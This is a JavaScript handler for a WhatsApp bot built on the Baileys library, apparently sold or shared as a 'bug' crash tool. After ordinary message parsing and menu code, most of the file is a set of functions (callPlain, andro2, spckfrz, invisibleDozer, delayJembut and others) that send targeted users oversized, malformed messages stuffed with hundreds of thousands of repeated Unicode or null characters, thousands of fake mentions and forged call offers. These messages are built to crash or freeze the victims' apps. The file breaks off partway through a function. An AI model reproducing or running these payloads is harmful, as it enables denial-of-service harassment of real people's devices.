// -------------------- [ Dependencies ] --------------------
const config = require('./settings/config')
const fs = require('fs')
const axios = require('axios')
const chalk = require("chalk")
const util = require("util")
const path = require("path")
const os = require('os')
const crypto = require('crypto')
const speed = require('performance-now')
const { default: baileys, getContentType, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');
const { smsg, fetchJson, sleep, formatSize } = require('./lib/myfunction') 

// -------------------- [ Handler ] --------------------
module.exports = prim = async (prim, m, chatUpdate, store) => {
    try {
        // --- Message Parsing ---
        const body = (
            m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
            m.mtype === "videoMessage" ? m.message.videoMessage.caption :
            m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
            m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
            m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
            m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text : ""
        );

        const sender = m.key.fromMe ? prim.user.id.split(":")[0] + "@s.whatsapp.net" || prim.user.id : m.key.participant || m.key.remoteJid;
        const senderNumber = sender.split('@')[0];
        const budy = (typeof m.text === 'string' ? m.text : '');
        const prefa = ["", "!", ".", ",", "🐤", "🗿"];

        const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><™©®Δ^βα~¦|/\\©^]/;
        const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
        const from = m.key.remoteJid;
        const isGroup = from.endsWith("@g.us");
        const botNumber = await prim.decodeJid(prim.user.id);
        
        // --- Owner & Bot Check ---
        const kontributor = JSON.parse(fs.readFileSync(path.resolve(__dirname, './lib/database/owner.json'), 'utf8'))
        const isOwner = [botNumber, ...kontributor].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender)
        const isBot = botNumber.includes(senderNumber)

        // --- Command Parsing ---
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const command2 = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1);
        const pushname = m.pushName || "No Name";
        const text = q = args.join(" ");

        // --- Quoted Message Check ---
        const quoted = m.quoted ? m.quoted : m;
        const mime = (quoted.msg || quoted).mimetype || '';
        const qmsg = (quoted.msg || quoted);
        const isMedia = /image|video|sticker|audio/.test(mime);
        
        // --- Group Info ---
        const groupMetadata = m?.isGroup ? await prim.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || []: [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);
        const isBotAdmins = m?.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m?.isGroup ? groupAdmins.includes(m.sender) : false;
        const isGroupOwner = m?.isGroup ? groupOwner === m.sender : false;
        
        // -------------------- [ Global Image ] --------------------

        const S1 = fs.readFileSync(`./lib/media/S1.jpg`)
        const imageList = [
            "https://files.catbox.moe/6ngbg0.jpegg",
            "https://files.catbox.moe/6ngbg0.jpeg",
        ];
        const SR = imageList[Math.floor(Math.random() * imageList.length)];
        const ImageZnX = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(from ? {
                    remoteJid: "@s.whatsapp.net"
                } : {})
            },
            "message": {
                "orderMessage": {
                    "orderId": "594071395007984",
                    "thumbnail": S1,
                    "itemCount": 2009,
                    "status": "INQUIRY",
                    "surface": "CATALOG",
                    "message": `×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×\n¿? version 1.2-vip`,
                    "orderTitle": config.settings.title,
                    "sellerJid": "50942350993@s.whatsapp.net",
                    "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
                    "totalAmount1000": "2009",
                    "totalCurrencyCode": "IDR"
                }
            }
        }
        async function zreply(text) {
            prim.sendMessage(m.chat, {
                text: text,
                contextInfo: {
                    mentionedJid: [sender],
                    externalAdReply: {
                        title: config.settings.title,
                        body: config.settings.description,
                        thumbnailUrl: SR,
                        sourceUrl: config.socialMedia.Telegram,
                        renderLargerThumbnail: false,
                    }
                }
            }, { quoted: ImageZnX })
        }

        // -------------------- [ Utility Functions ] --------------------

        const menureply = async (menu) => {
            prim.sendMessage(m.chat, {
                interactiveMessage: {
                    title: menu,
                    footer: config.settings.footer,
                    thumbnail: SR,
                    nativeFlowMessage: {
                        messageParamsJson: JSON.stringify({
                            limited_time_offer: {
                                text: "×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× 2026",
                                url: "t.me/Dracula509",
                                copy_code: "普里米斯·克拉舍",
                                expiration_time: Date.now() * 9999
                            },
                            bottom_sheet: {
                                in_thread_buttons_limit: 2,
                                divider_indices: [1, 2, 3, 4, 5, 999],
                                list_title: "×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×",
                                button_title: "普里米斯·克拉舍"
                            },
                            tap_target_configuration: {
                                title: "▸ X ◂",
                                description: "bomboclard",
                                canonical_url: "https://t.me/Dracula509",
                                domain: "shop.example.com",
                                button_index: 0
                            }
                        }),
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: JSON.stringify({ has_multiple_buttons: true })
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: JSON.stringify({
                                    title: "¿ execute ?",
                                    sections: [
                                        {
                                            title: "#×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×",
                                            highlight_label: "label",
                                            rows: [
                                                {
                                                    title: "Bũg - F̃eãturẽ", 
                                                    description: "普里米斯·克拉舍",
                                                    id: `${prefix}bug-menu`
                                                },
                                                {
                                                    title: "Groũ p - Mẽnũ", 
                                                    description: "普里米斯·克拉舍",
                                                    id: `${prefix}groupmenu`
                                                },
                                                { 
                                                    title: "Õwnẽr - Mẽnũ",
                                                    description: "普里米斯·克拉舍",
                                                    id: `${prefix}ownermenu`
                                                },
                                                { 
                                                    title: "Õthẽr - Mẽnũ",
                                                    description: "普里米斯·克拉舍",
                                                    id: `${prefix}othermenu`
                                                },
                                                { 
                                                    title: "T̃q̃T̃õ̃",
                                                    description: "普里米斯·克拉舍",
                                                    id: `${prefix}tqto`
                                                }
                                            ]
                                        }
                                    ],
                                    has_multiple_buttons: true
                                })
                            },
                            {
                                name: "quick_reply",
                                buttonParamsJson: JSON.stringify({
                                    display_text: "Scr ĩp t̃",
                                    id: `${prefix}sc`
                                })
                            }
                        ]
                    }
                }
            }, { quoted: ImageZnX })
        }
        
        async function sreply(teks) {
                const buttons = [
                    {
                        buttonId: '.menu',
                        buttonText: { displayText: '←𝐁͢𝐀͡𝐂͜𝐊 ⍣᳟ 𝐓͜𝐎͢ 𝐌͡𝐄͜𝐍͢𝐔🦠' },
                        type: 1
                    }
                ];

                const buttonMessage = {
                    image: { url: SR },
                    caption: teks,
                    footer: '×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×',
                    buttons,
                    headerType: 4,
                    contextInfo: {
                        forwardingScore: 99999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "1@",
                            serverMessageId: null,
                            newsletterName: " UPDATE "
                        },
                    },
                    viewOnce: true
                };

                return await prim.sendMessage(m.chat, buttonMessage, { quoted: ImageZnX });
        }
        
const menuX = imageList[Math.floor(Math.random() * imageList.length)];
const imageList2 = [
    "https://files.catbox.moe/dvd8po.jpeg",
    "https://files.catbox.moe/pxpw9w.jpg"
];

        // -------------------- [ Logging ] --------------------
        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`▢ New Message`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   ▢ Date : ${new Date().toLocaleString()} \n` +
                    `   ▢ Message: ${m.body || m.mtype} \n` +
                    `   ▢ Sender: ${pushname} \n` +
                    `   ▢ JID: ${senderNumber} \n`
                )
            );
            console.log();
        }
        
//==============Functions andro================

async function callPlain(isTarget, isVideo = false) {
const { encodeSignedDeviceIdentity, jidEncode, jidDecode, encodeWAMessage, patchMessageBeforeSending, encodeNewsletterMessage } = require("@whiskeysockets/baileys");
  const devices = (await prim.getUSyncDevices([isTarget], false, false)).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
  await prim.assertSessions(devices);

  const xnxx = () => {
    const map = {};
    return {
      mutex(key, fn) {
        map[key] ??= { task: Promise.resolve() };
        map[key].task = (async prev => { try { await prev; } catch {} return fn(); })(map[key].task);
        return map[key].task;
      }
    };
  };

  const memek = xnxx();
  const bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
  const porno = prim.createParticipantNodes.bind(prim);
  const yntkts = prim.encodeWAMessage?.bind(prim);

  prim.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
    if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
    const patched = await (prim.patchMessageBeforeSending?.(message, recipientJids) ?? message);
    const ywdh = Array.isArray(patched) ? patched : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

    const { id: meId, lid: meLid } = prim.authState.creds.me;
    const omak = meLid ? jidDecode(meLid)?.user : null;
    let shouldIncludeDeviceIdentity = false;

    const nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
      const { user: targetUser } = jidDecode(jid);
      const { user: ownPnUser } = jidDecode(meId);
      const isOwnUser = targetUser === ownPnUser || targetUser === omak;
      const y = jid === meId || jid === meLid;
      if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

      const bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));
      return memek.mutex(jid, async () => {
        const { type, ciphertext } = await prim.signalRepository.encryptMessage({ jid, data: bytes });
        if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
        return { tag: 'to', attrs: { jid }, content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }] };
      });
    }));

    return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
  };

  const awik = crypto.randomBytes(32);
  const awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
  const { nodes: destinations, shouldIncludeDeviceIdentity } = await prim.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });

  const offerContent = [
    { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
    { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
    { tag: "net", attrs: { medium: "3" } },
    { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
    { tag: "encopt", attrs: { keygen: "2" } },
    { tag: "destination", attrs: {}, content: destinations },
    ...(shouldIncludeDeviceIdentity ? [{ tag: "device-identity", attrs: {}, content: encodeSignedDeviceIdentity(prim.authState.creds.account, true) }] : [])
  ];

  if (isVideo) offerContent.splice(2, 0, { tag: "video", attrs: { orientation: "0", screen_width: "99999", screen_height: "99999", device_orientation: "0", enc: "vp8", dec: "vp8" } });

  const lemiting = {
    tag: "call",
    attrs: { to: isTarget, id: prim.generateMessageTag(), from: prim.user.id },
    content: [{ tag: "offer", attrs: { "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(), "call-creator": prim.user.id }, content: offerContent }]
  };

  await prim.sendNode(lemiting);
  console.log(chalk.green("Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉"));
}

async function andro2(isTarget) {
  const imageMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0&mms3=true",
    mimetype: "image/jpeg",
    fileSha256: "ud/dBUSlyour8dbMBjZxVIBQ/rmzmerwYmZ76LXj+oE=",
    fileLength: "10737418240000",
    height: 9999,
    width: 9999,
    mediaKey: "TgT5doHIxd4oBcsaMlEfa+nPAw4XWmsQLV4PDH1jCPw=",
    fileEncSha256: "IkoJOAPpWexlX2UnqVd5Qad4Eu7U5JyMZeVR1kErrzQ=",
    directPath: "/v/t62.7118-24/35284527_643231744938351_8591636017427659471_n.enc?ccb=11-4&oh=01_Q5AaIF8-zrQNGs5lAiDqXBhinREa4fTrmFipGIPYbWmUk9Fc&oe=67C9A6D5&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1738686532",
    jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAB4ASAMBIgACEQEDEQH/xAArAAACAwEAAAAAAAAAAAAAAAAEBQACAwEBAQAAAAAAAAAAAAAAAAAAAAD/2gAMAwEAAhADEAAAABFJdjZe/Vg2UhejAE5NIYtFbEeJ1xoFTkCLj9KzWH//xAAoEAABAwMDAwMFAAAAAAAAAAABAAIDBBExITJBEBJRBRMUIiNicoH/2gAIAQEAAT8AozeOpd+K5UBBiIfsUoAd9OFBv/idkrtJaCrEFEnCpJxCXg4cFBHEXgv2kp9ENCMKujEZaAhfhDKqmt9uLs4CFuUSA09KcM+M178CRMnZKNHaBep7mqK1zfwhlRydp8hPbAQSLgoDpHrQP/ZRylmmtlVj7UbvI6go6oBf/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwAv/8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwAv/9k=",
    scansSidecar: "nxR06lKiMwlDForPb3f4fBJq865no+RNnDKlvffBQem0JBjPDpdtaw==",
    scanLengths: [2226, 6362, 4102, 6420],
    midQualityFileSha256: "erjot3g+S1YfsbYqct30GbjvXD2wgQmog8blam1fWnA="
  };

  const media = await prepareWAMessageMedia(
    { image: imageMessage },
    { upload: prim.waUploadToServer }
  );

  let push = [];
  for (let r = 0; r < 1000; r++) {
    push.push({
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
          `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ]
      },
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: "❗❗❗❗❗❗❗❗❗" 
             + "ꦽ".repeat(60000)
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        hasMediaAttachment: true,
        imageMessage: media.imageMessage
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "galaxy_message",
            buttonParamsJson: `{\"flow_cta\":\"${"ꦽ".repeat(60000)}\",\"flow_message_version\":\"3\"}`,
          },
          {
            name: "cta_url",
            buttonParamsJson: JSON.stringify({
              display_text: "ꦽ".repeat(60000), 
              url: "https://Wa.me/stickerpack/X",
              merchant_url: "https://Wa.me/stickerpack/Y"
            })
          }
        ]
      })
    });
  }

  let msg = await generateWAMessageFromContent(
    isTarget,
    {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: proto.Message.InteractiveMessage.fromObject({
            body: proto.Message.InteractiveMessage.Body.create({
              text: " # 🚯 - 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄 • UI System \n" 
                   + "ꦽ".repeat(60000)
            }),
            footer: proto.Message.InteractiveMessage.Footer.create({
              text: " ─×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× "
            }),
            header: proto.Message.InteractiveMessage.Header.create({
              hasMediaAttachment: false
            }),
            carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
              cards: [...push]
            })
          })
        }
      }
    },
    {}
  );

  await sleep(1000);
  await prim.relayMessage(
    isTarget,
    msg.message,
    {
      participant: { jid: isTarget },
      messageId: msg.key.id
    }
  );
}

async function delay1(isTarget) {
  for (let z = 0; z < 50; z++) {
    let msg = generateWAMessageFromContent(isTarget, {
      viewOnceMessageV2: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              mentions: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
            },
            body: {
              text: "᬴".repeat(45000),
              format: "DEFAULT"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: `{\"flow_cta\":\"${"᬴".repeat(90000)}\",\"flow_message_version\": \"3\"}`,
              version: 3
            }
          }
        }
      }
    }, {});

    await prim.relayMessage(
      isTarget,
      {
        groupStatusMessageV2: {
          message: msg.message
        }
      },
      {
        messageId: msg.key.id,
        participant: { jid: isTarget }
      }
    )
  };
  await sleep(5000)
}

async function InVisibleX(target, show = true) {
  let msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
      footerText: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄 " + "\u0000".repeat(500000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (show) {
    await prim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "By ×͜× 𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀 ×͜×👾",
            },
            content: undefined,
          },
        ],
      }
    );
  }
 }

async function glxFrcInvisible(prim, target) {
  try {
    for (let i = 0; i < 100; i++) {
      const msg = await generateWAMessageFromContent(
        target,
        {
          interactiveResponseMessage: {
            contextInfo: {},
            body: {
              text: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
              format: "EXTENSION_1"
            },
            nativeFlowResponseMessage: {
              name: "galaxy_message",
              paramsJson: JSON.stringify({ flow_cta: "\u9999".repeat(90000) }),
              version: 3
            }
          }
        },
        {}
      );

      await prim.relayMessage(
        target,
        {
          groupStatusMessageV2: {
            message: msg.message
          }
        },
        { participant: { jid: target } }
      );
    }
  } catch (e) {
    console.error("error:", e);
  }
}

async function CInVisible(target, show = true) {
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {}
  )

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  })

  if (show) {
    await prim.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: "Yy",
            },
            content: undefined,
          },
        ],
      }
    )
  }
}

async function spckfrz(prim, target) {
  try {
    const mentionedList = [
      "0@s.whatsapp.net",
      ...Array.from({ length: 1999 }, () =>
        `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
      )
    ];

    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            stickerPackMessage: {
              stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
              name: "ꦽ".repeat(60000),
              publisher: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              stickers: [
                ...Array.from({ length: 4700 }, () => ({
                  fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
                  isAnimated: false,
                  emojis: ["🦠", "🩸","\n","💥"],
                  accessibilityLabel: "",
                  stickerSentTs: "PnX-ID-msg",
                  isAvatar: true,
                  isAiSticker: true,
                  isLottie: true,
                  mimetype: "application/pdf"
                }))
              ],
              fileLength: "1073741824000",
              fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
              fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
              mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
              directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4",
              contextInfo: {
                remoteJid: "X",
                participant: "0@s.whatsapp.net",
                stanzaId: "1234567890ABCDEF",
                mentionedJid: mentionedList
              },
              packDescription: "",
              mediaKeyTimestamp: "1747502082",
              trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
              thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4",
              thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
              thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
              thumbnailHeight: 252,
              thumbnailWidth: 252,
              imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
              stickerPackSize: "999999999",
              stickerPackOrigin: "USER_CREATED",
            }
          }
        }
      },
      {}
    );

    await prim.relayMessage(target, msg.message, {
      participant: { jid: target },
      messageId: msg.key.id
    });
    
  } catch (err) {
    console.error("XBlank Error:", err);
  }
}

async function VisibleX(target) {
  const msg = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "Ω",
      contentText: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
      footerText: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
      buttons: [
        {
          buttonId: ".null",
          buttonText: {
            displayText: " ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× ¿? " + "\u0000".repeat(500000)
          },
          type: 1
        }
      ],
      headerType: 1
    }
  }, {})

  await prim.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target }
  })
}

async function CVisible(target) {
  await prim.relayMessage(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "call_permission_request",
              paramsJson: "\u0000".repeat(1000000),
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function gsglx(isTarget) {
  let msg = await generateWAMessageFromContent(isTarget, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32)
        },
        interactiveResponseMessage: {
          body: {
            text: "🎭⃟༑𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄ཀ͜͡🐉",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900000)}\",\"flow_message_version\":\"3\"}`,
            version: 3
          },
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            forwardedNewsletterMessageInfo: {
              newsletterName: "©️ running since 2020 to 20##?",
              newsletterJid: "0@newsletter",
              serverMessageId: 1
            }
          }
        }
      }
    }
  }, {});

  await prim.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  });
}

async function Blank2(prim, target) {
try {
const msg = generateWAMessageFromContent(target, {
  viewOnceMessage: {
    message: {
      interactiveMessage: {
        body: { text: "\u0000" },
        contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ]
          },
        nativeFlowMessage: {
          buttons: [
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "single_select",
              buttonParamsJson: JSON.stringify({
                title: "ោ៝".repeat(60000)
              })
            },
            {
              name: "galaxy_message",
              buttonParamsJson: JSON.stringify({
                flow_message_version: "3",
                flow_token: "unused",
                flow_id: "9876543210",
                flow_cta: "ោ៝".repeat(30000),
                flow_action: "form_submit",
                flow_action_payload: { from_id: null },
                icon: "PROMOTE"
              })
            }
          ],
          messageParamsJson: "{}".repeat(10000)
        }
      }
    }
  }
}, {});
  await prim.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
   });
  } catch (err) {
    console.error(err);
  }
}

async function invisibleDozer(prim, target) {
  try {
    const msg = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: { text: "\u0000" },
              nativeFlowMessage: {
                messageParamsJson: "{}".repeat(10000),
              },
              contextInfo: {
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: Array.from(
                  { length: 42000 },
                  () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                )
              }
            }
          }
        }
      },
      {}
    );
    await prim.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      participant: { jid: target }
    });
  } catch (err) {
    console.error(err);
    throw new Error(err.message);
  }
}

async function delayJembut(prim, target) {
  try {
    const n = await prim.relayMessage(
      target,
      {
        extendedTextMessage: {
          text: "\u0000".repeat(10000),
          matchedText: "⃝꙰꙰꙰".repeat(10000),
          description: "Its Me ×͜× 𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀 ×͜×",
          title: "᬴".repeat(10000),
          previewType: "NONE",
          jpegThumbnail: null,
          inviteLinkGroupTypeV2: "DEFAULT",
          contextInfo: {
            isForwarded: true,
            forwardingScore: 999,
            remoteJid: "status@broadcast",
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1900 },
                () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
              )
            ],
            quotedMessage: {
              paymentInviteMessage: {
                serviceType: 3,
                expiryTimestamp: Date.now() + 1814400000
              }
            },
            forwardedNewsletterMessageInfo: {
              newsletterName: "⃝꙰꙰꙰",
              newsletterJid: "13135550002@newsletter",
              serverId: 1
            }
          }
        }
      },
      { participant: { jid: target } }
    );
    await prim.sendMessage(target, {
      delete: { fromMe: true, remoteJid: target, id: n }
    });
  } catch (err) {
    console.error("error:", err);
    throw new Error(err.message);
  }
}

async function galaxy(isTarget) {
